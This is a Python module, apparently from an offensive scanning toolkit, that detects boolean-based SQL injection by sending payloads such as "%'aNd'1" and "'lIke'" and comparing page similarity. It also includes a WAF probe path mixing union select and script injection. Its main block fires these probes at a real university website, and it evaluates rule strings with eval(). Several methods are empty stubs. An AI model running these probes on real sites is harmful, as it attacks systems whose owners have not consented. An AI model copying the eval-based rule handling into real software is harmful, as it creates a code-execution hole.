# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-06 23:27

from core.public import *
from core.setting import SQL_FALG_SIGN
from core.constant import ProgramPath
from exploit import BaseExploit
from dict.sql.waf.rule import *
from sklearn.feature_extraction.text import CountVectorizer
from sklearn.preprocessing import StandardScaler
from scipy import spatial
from urllib.parse import quote

os_run = ProgramPath.PYTHON + ' ' + ProgramPath.SQLMAP


def calculation(htmlList):
    """learn from https://mp.weixin.qq.com/s?__biz=Mzg4MzY3MTgyMw==&mid=2247483720&idx=1&sn=5449ed47b74cf892c01eb8833b59c952&chksm=cf429728f8351e3eee7387ca85c79a705ae68122509484d49bc278e24c9de4e22ef0080dc0c8&mpshare=1&scene=23&srcid=1114LGKgJqRAT9xqFA9s2BwC&sharer_sharetime=1636911890316&sharer_shareid=1b35adb1b046ef1a6379932d3eabbaf8#rd
    check for bool injection
    """
    list_num = []
    list_signal = []

    # 步骤一
    cv = CountVectorizer()
    data = cv.fit_transform(htmlList)
    std = StandardScaler()
    data_list = std.fit_transform(data.toarray())
    print(data_list)

    # 步骤二
    for line in data_list:
        list_num.append(round(spatial.distance.cosine(data_list[0], line), 2))
    num = 0
    print(list_num)

    # 步骤三
    for signal in list_num:
        if signal != 0:
            if 1 / signal * 100 < 80:
                list_signal.append(num)
        num = num + 1
    print(list_signal)
    return list_signal


def sqlInjectionFormat(webParamList):
    """
    分析当前URL，对可能存在的注入点进行替换注入标记
    情况有如下：
    1、HTML的情况, 这种情况可能会存在多种情况，但是自己这里的话就简单处理
    2、单参数的情况, 这种情况只替换一次
    3、多参数的情况, 这种情况替换多次
    """
    finaWebParamLink = []
    for webParamLink in webParamList:
        if '.htm' in webParamLink:
            finaWebParamLink.append(webParamLink.replace('.htm', '@@.htm').replace('.shtm', '@@.shtm'))
        # single script param
        if '?' in webParamLink and '&' not in webParamLink:
            pass
            # webParamLink[index] =
    return finaWebParamLink


class SqlScan(BaseExploit):

    def __init__(self, domain, webParamsList):
        super().__init__()
        self.source = 'SqlScan'
        self.domain = domain
        self.webParamsList = sqlInjectionFormat(webParamsList)
        self.detectPathList = ['/list.php?k=1?aspx?id=1 and 1=1 union select user from admin%23<script>alert(1)</script>']
        self.sqlPayloadList = [quote(payload) for payload in ['-0', "%'aNd'1", "'lIke'", ',a']]  # int / search / like / order by
        self._getWafRule()

    def _getWafRule(self):
        self.wafRule = wafRule

    def _checkWaf(self, url):
        for detectPath in self.detectPathList:
            url = f'http://{self.domain}{detectPath}' if self.domain.startswith(
                ('http:', 'https:')) is False else f'{self.domain}{detectPath}'
            try:
                pass
                # r = requests.get(url)
            except Exception as e:
                print(e)

            for k, v in self.wafRule.items():
                for x in v:
                    try:
                        flag = eval(x)
                        if flag:
                            return True
                        return False
                    except Exception:
                        pass

    def paramScan(self, paramLink):
        pass

    def check(self, htmlList):
        """learn from https://mp.weixin.qq.com/s?__biz=Mzg4MzY3MTgyMw==&mid=2247483720&idx=1&sn=5449ed47b74cf892c01eb8833b59c952&chksm=cf429728f8351e3eee7387ca85c79a705ae68122509484d49bc278e24c9de4e22ef0080dc0c8&mpshare=1&scene=23&srcid=1114LGKgJqRAT9xqFA9s2BwC&sharer_sharetime=1636911890316&sharer_shareid=1b35adb1b046ef1a6379932d3eabbaf8#rd
        check for bool injection

        first: htmlList[0] is source html
        """
        list_num = []
        list_signal = []

        # 步骤一
        cv = CountVectorizer()
        data = cv.fit_transform(htmlList)
        std = StandardScaler()
        data_list = std.fit_transform(data.toarray())
        print(data_list)

        # 步骤二
        for line in data_list:
            list_num.append(round(spatial.distance.cosine(data_list[0], line), 2))
        num = 0
        print(list_num)

        # 步骤三
        for signal in list_num:
            if signal != 0:
                if 1 / signal * 100 < 80:
                    list_signal.append(num)
            num = num + 1
        print(list_signal)
        return list_signal

    async def exploit(self):
        for _ in self.webParamsList:
            self.paramScan(_)
        print('[+] [{}] [{}] {}'.format(self.source, len(self.resList), self.resList))
        self.writeFile(self.resList, 15)

    async def main(self):
        await self.exploit()


class ErrorInjection:
    pass


class BoolInjection:
    pass


if __name__ == '__main__':

    import requests as rs


    def check():
        response = rs.get('http://test.shack2.org/mysql.jsp?id=1')
        currentHeader = str(response.headers)
        currentText = response.text
        for k, v in wafRule.items():
            for x in v:
                res = eval(x)
                if res:
                    return True
                return False

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'    }
    htmlList = []
    # htmlList.append(rs.get('http://test.shack2.org/orderby/userlist.jsp?order=id').text)
    # htmlList.append(rs.get("http://test.shack2.org/orderby/userlist.jsp?order=id-0").text)
    # htmlList.append(rs.get("http://test.shack2.org/orderby/userlist.jsp?order=id%'aNd'1").text)
    # htmlList.append(rs.get("http://test.shack2.org/orderby/userlist.jsp?order=id'lIke'").text)
    # htmlList.append(rs.get("http://test.shack2.org/orderby/userlist.jsp?order=id,a'").text)

    # htmlList.append(rs.get('http://test.shack2.org/mysqlString.jsp?type=1').text)
    # htmlList.append(rs.get("http://test.shack2.org/mysqlString.jsp?type=1-0").text)
    # htmlList.append(rs.get("http://test.shack2.org/mysqlString.jsp?type=1%'aNd'1").text)
    # htmlList.append(rs.get("http://test.shack2.org/mysqlString.jsp?type=1'lIke'").text)
    # htmlList.append(rs.get("http://test.shack2.org/mysqlString.jsp?type=1,a").text)

    htmlList.append(rs.get("http://anding.zjhu.edu.cn/1675/list.htm").text)
    htmlList.append(rs.get("http://anding.zjhu.edu.cn/1675/list-0.htm").text)
    htmlList.append(rs.get("http://anding.zjhu.edu.cn/1675/list%'aNd'1.htm").text)
    htmlList.append(rs.get("http://anding.zjhu.edu.cn/1675/list'lIke'.htm").text)
    htmlList.append(rs.get("http://anding.zjhu.edu.cn/1675/list,a'.htm").text)

    calculation(htmlList)
